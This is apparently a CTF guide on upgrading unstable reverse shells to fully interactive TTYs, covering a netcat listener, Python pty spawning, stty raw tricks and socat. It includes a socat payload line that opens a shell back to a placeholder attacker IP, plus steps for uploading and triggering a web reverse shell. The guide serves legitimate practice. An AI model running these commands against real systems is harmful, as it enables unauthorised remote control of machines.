# Reverse Shell Upgrade
Welcome in this short yet very useful guide for CTFs challenges about improving our reverse shells.

Very often our way to gain a foot hold inside the machine involves creating some reverse-shell scripts, but there is a problem, the shell is very unstable and not interactive.

Since we want to have a good environment to do our investigations in the target machine we have to take some steps forward and make our shell a fully interactive one.

Here i will show some ways to achieve it, but first let's see how we commonly gain a shell in the first place:

<br/>
<br/>

## Gaining a Shell
For this demo i will focus specifically on web-apps but most things can be applied in other contexts too, re-arrange at your needs.

The most commonly used method to gain reverse-shell on the target system is usually by creating a short script depending on the services and infrastructure type of the target (example: the websiteis running a PHP backed, we make a PHP reverse shell...).

This is the first step, now we have to find a way to upload the reverse shell and prepare our listener to wait for the connection.

We will use *netcat* as it is a very common tool and installed on a huge portion of the systems:

```bash
nc -lvnp 1234
```
(you can choose another port if you want, just be sure to match it with the one you have in your payload and avoid ports used by other services)

Finally we can activate the connection by visiting the location where we uploaded our reverse-shell payload, either by navigating to it with the browser or using *curl*.

Now if everything was done right we should have a shell on the target system (usually a limited shell as an unprivileged user).

<br/>
<br/>

## Upgrading Methods
<br/>

### Python Pseudo Terminal
This is one of the quickest way, once we have our initial shell, we can firstly check if on the target system python is installed, if yes we can use this command to enable the execution of more commands:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

<br/>

### TTY Options
Now to the best option, this will make a fully interactive TTY:

We will start with the python psedudo terminal script on the shell
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Now we can press `CTRL+Z` to put the reverse-shell session in background.
In your machine terminal use:
```bash
stty raw -echo
```

Now we can bring back in foreground the rev-shell session using the commands `fg`.

You should now see the original reverse shell, might be with a broken graphic but no worries, enter the command:
```bash
reset
```

Finally we can set some ENV variables:
```bash
export SHELL=bash
export TERM=xterm-256color
stty rows VALUE columns VALUE  
```
(change the rows and columns VALUE depending on your current terminal measures)

With all this done right we should now have an interactive shell, where we can run commands like `clear` and even `CTRL+C` without accidentally terminating the session.

NOTE: I have encountered some problems using the zsh shell as my default, so here are some ideas on how to avoid them:
- The easiest way is to switch to a bash shell before making the listener and receiving the reverse-shell, otherwise you can:
- Use `rlwrap nc -lvnp` when setting up your listener;
- Avoid putting a space in your python pty command after the import;
- Type `stty size;stty raw -echo;fg` all on one line.

<br/>

### Socat
Another way is to use *Socat*, a kind of newer and more powerful version of *netcat*, it s quite simple to do, the only catch is that most of the times it is not installed on the target systems, meaning we won't be able to use it.

On your machine set up the listener:
```bash
socat file:`tty`,raw,echo=0 tcp-listen:1234
```

This is the payload that has to be executed on the target(sobstitute with your IP):
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER-IP:1234
```

<br/>

This are some of the most commonly used methods, i encourage everyone to try them and why mot, also finding new ones specific for your challenge environment need. <br>
See you in the next guide/writeup, Happy hacking!
